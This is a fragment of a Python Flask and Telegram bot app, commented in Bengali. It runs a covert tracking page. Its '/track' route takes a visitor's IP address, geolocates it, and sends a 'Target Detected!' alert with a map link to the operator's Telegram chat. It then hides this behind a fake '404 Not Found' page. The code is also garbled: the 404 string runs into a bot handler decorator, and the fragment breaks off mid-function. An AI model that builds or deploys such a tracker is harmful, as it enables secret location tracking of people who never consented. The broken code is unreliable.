# --- ৩. রুট এবং লগইন লজিক ---
@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == SERVER_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('home'))
        else:
            error = "ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/home')
def home():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return """
    <body style="background-color:black; color:green; text-align:center; padding-top:100px; font-family:monospace;">
        <h1>Cyber.71.ENAFUL Server is Live</h1>
        <p>Managed by Boss Enaful</p>
    </body>
    """

# --- ৪. ট্র্যাকিং পেজ ---
@app.route('/track')
def track_user():
    # ট্র্যাকিংয়ের সময় ইউজারের আইপি ও লোকেশন সরাসরি নেওয়া হবে
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    g = geocoder.ip(user_ip)
    lat_lng = g.latlng if g.latlng else [0, 0]
    location_info = f"{g.city}, {g.country}" if g.city else "অজানা লোকেশন"
    
    map_link = f"https://www.google.com/maps?q={lat_lng[0]},{lat_lng[1]}"
    
    alert = (
        "⚠️ **Target Detected!** ⚠️\n\n"
        f"🌐 **IP:** `{user_ip}`\n"
        f"📍 **Location:** {location_info}\n"
        f"🗺️ **Maps:** [Open Map]({map_link})"
    )
    
    if ADMIN_ID:
        bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
    
    # ইউজার যদি আগে লগইন না করে থাকে তবে তাকে পাসওয়ার্ড পেজে পাঠাবে
    if not session.get('logged_in'):
        return redirect(url_for('login'))
        
    return "<h1>404 Not Found</h1@bot.message_handler(commands=['start'])
def welcome_list(message):
    global ADMIN_ID
    if message.from_user.username == ADMIN_USERNAME:
        ADMIN_ID = message.chat.id

    markup = types.InlineKeyboardMarkup()
